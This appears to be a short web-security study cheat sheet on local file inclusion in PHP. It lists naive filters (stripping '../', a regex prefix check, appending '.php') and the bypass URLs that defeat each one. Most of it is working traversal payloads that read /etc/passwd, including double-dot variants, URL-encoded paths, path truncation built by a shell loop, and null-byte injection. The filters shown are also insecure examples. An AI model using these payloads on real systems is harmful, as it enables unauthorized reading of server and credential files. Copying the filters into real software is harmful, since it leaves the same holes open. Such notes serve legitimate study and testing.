
Security Measure (Replace string)
```php
$language = str_replace('../', '', $_GET['language']);
```
Bypass
```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=..././..././..././..././etc/passwd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/....\/etc/passwd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/....\/etc/passwd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=....////....////....////....////etc/passwd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Security Measure (Regex) ** Ensure Path includes correct base directive in this case languages**
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
Bypass
```
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

Security Measure(Path Truncation) PHP defined string character limit is 4096 characters
1. Determine long path to make
2. Include disregarded pathing techniques(/etc/passwd/. & ////etc/passwd & /etc/./passwd)
3. Create Path
```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

Security Measure(Append File extension)
```php
$language = append_string($_GET['language'],'.php');
```

Bypass (Before php 5.5)
Null byte injection
```
/etc/passwd%00.php
```

